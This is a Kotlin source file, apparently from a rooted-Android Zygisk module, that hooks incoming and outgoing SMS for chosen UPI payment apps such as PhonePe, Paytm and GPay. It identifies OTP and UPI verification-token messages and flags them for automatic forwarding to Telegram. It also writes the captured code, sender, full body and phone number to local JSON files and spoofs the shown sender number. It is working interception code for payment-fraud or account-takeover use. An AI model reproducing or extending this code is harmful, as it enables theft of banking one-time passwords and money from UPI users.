package com.hivirtus.zygiskmode

import android.content.Context
import org.json.JSONObject
import java.util.regex.Pattern

object SmsMatcher {

    private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
    private val PLACEHOLDER_SENDER = "AD-TEST-S"

    fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
        UpiAppRegistry.ALL.filter { config.hookedUpiApps[it.packageName] == true }

    fun userSenderId(config: ModuleConfig): String? {
        val id = config.injectSenderId.trim()
        if (id.isBlank()) return null
        if (id.equals(PLACEHOLDER_SENDER, ignoreCase = true)) return null
        return id
    }

    fun matchedHookedApp(config: ModuleConfig, peer: String, body: String): UpiAppRegistry.UpiApp? {
        val hooked = enabledHookedApps(config)
        if (hooked.isEmpty()) return null
        return UpiAppRegistry.matchAmong(hooked, peer, body)
    }

    fun shouldCaptureIncoming(config: ModuleConfig, sender: String, body: String): Boolean {
        if (!config.hookIncomingSms && !config.hookUpiVerification) return false
        return shouldInterceptHookedUpi(config, sender, body)
    }

    fun shouldCaptureOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
        if (!config.hookOutgoingSms) return false
        return shouldInterceptHookedUpi(config, recipient, body)
    }

    /** Sirf hooked UPI app ka verify/token SMS — Telegram format same rahega */
    fun shouldInterceptHookedUpi(config: ModuleConfig, peer: String, body: String): Boolean {
        if (body.isBlank() || peer.isBlank()) return false
        val hooked = enabledHookedApps(config)
        if (hooked.isEmpty()) return false
        if (!isUpiVerificationContent(body)) return false

        if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
        if (UpiAppRegistry.matchAmongBySender(hooked, peer) != null) return true
        if (UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true

        // Encrypted UPI verify token — jab sirf 1 app hooked ho
        if (isEncryptedToken(body) && hooked.size == 1) return true

        return false
    }

    /** Telegram pe sirf hooked UPI app verification token / OTP */
    fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String): Boolean {
        if (!config.autoForwardToken) return false
        return shouldInterceptHookedUpi(config, peer, body)
    }

    fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
        userSenderId(config)?.let { return it }
        if (isCarrierSenderId(actualPeer)) return actualPeer.trim()
        val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
        return spoof.ifBlank { "INTERCEPT" }
    }

    fun isCarrierSenderId(sender: String): Boolean {
        val s = sender.trim()
        if (s.isBlank()) return false
        if (isNumericSender(s)) return false
        return s.any { it.isLetter() }
    }

    fun isNumericSender(sender: String): Boolean {
        val digits = sender.replace("\\D".toRegex(), "")
        return digits.length >= 8 && !sender.any { it.isLetter() }
    }

    /** Telegram / local — poora SMS body dikhao, sirf OTP digits mat kaato agar UPI verification hai */
    fun extractToken(body: String, autoExtract: Boolean): String {
        val trimmed = body.trim()
        if (trimmed.isEmpty()) return ""
        if (isEncryptedToken(trimmed)) return trimmed
        if (isUpiVerificationContent(trimmed)) return trimmed
        if (!autoExtract) return trimmed

        val matcher = OTP_PATTERN.matcher(trimmed)
        if (matcher.find()) {
            val digits = matcher.group(1) ?: trimmed
            if (digits.length < 6 && trimmed.length > 20) return trimmed
            return digits
        }
        return trimmed
    }

    fun isEncryptedToken(text: String): Boolean {
        if (text.length < 24) return false
        val compact = text.replace("\\s".toRegex(), "")
        if (compact.length < 20) return false
        val tokenChars = compact.count { it.isLetterOrDigit() || it in "+/=)(?&._-" }
        return tokenChars >= compact.length * 0.85
    }

    private fun isUpiVerificationContent(body: String): Boolean {
        if (isEncryptedToken(body)) return true
        val trimmed = body.trim()
        if (trimmed.length <= 3) return false
        val upper = trimmed.uppercase()
        val keywords = listOf(
            "OTP", "UPI", "VERIFY", "VERIFICATION", "TOKEN", "YESPAY", "YESPRO",
            "PHONEPE", "PAYTM", "GPAY", "BHIM", "CODE", "PIN", "BANK", "PAY"
        )
        return keywords.any { upper.contains(it) }
    }
}

object OtpCaptureWriter {

    fun write(context: Context, otp: LastOtp) {
        val json = JSONObject().apply {
            put("otp", otp.otp)
            put("sender", otp.sender)
            put("body", otp.body)
            put("direction", otp.direction)
            put("phone", otp.phone)
            put("raw_peer", otp.rawPeer)
            put("message_label", otp.messageLabel)
            put("captured_at", System.currentTimeMillis())
        }
        val payload = json.toString()
        val appDir = context.getExternalFilesDir(null) ?: context.filesDir

        try {
            appDir.mkdirs()
            java.io.File(appDir, ConfigManager.APP_OTP_NAME).writeText(payload)
        } catch (_: Exception) {}

        try {
            java.io.File("/data/local/tmp/hivirtus_last_otp.json").writeText(payload)
        } catch (_: Exception) {}
    }
}
